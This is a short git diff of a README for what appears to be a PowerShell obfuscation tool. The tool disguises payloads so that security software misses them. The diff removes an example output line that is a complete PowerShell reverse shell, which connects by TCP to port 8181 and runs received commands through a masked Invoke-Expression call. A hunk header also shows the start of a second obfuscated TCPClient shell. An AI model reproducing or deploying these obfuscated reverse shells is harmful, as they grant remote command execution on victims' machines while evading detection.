@@ -55,7 +55,7 @@ $client = New-Object Sys""t''em.Net.Sockets.TCPClient('127.0.0.1',8181);$stream 
 
 ```powershell
 PS C:\auto_powershell_obfuscation> python .\obfuscator.py -m gcm -f .\payload.txt
-$tcpclient = new-object net.sockets.tcpclient('127.0.0.1', 8181);$networkstream = $tcpclient.getstream();$streamwriter = new-object io.streamwriter($networkstream);function writetostream ($string) {[byte[]]$script:buffer = 0..$tcpclient.receivebuffersize | % {0};$streamwriter.write($string + 'shell> ');$streamwriter.flush()}writetostream '';while(($bytesread = $networkstream.read($buffer, 0, $buffer.length)) -gt 0) {$command = ([text.encoding]::utf8).getstring($buffer, 0, $bytesread - 1);$output = try {&(gcm in*******************o****e-ex*****************r*************s******************i****n) $command 2>&1 | out-string} catch {$_ | out-string}writetostream ($output)}$streamwriter.close()
+
 ```
 
 ### Entropy
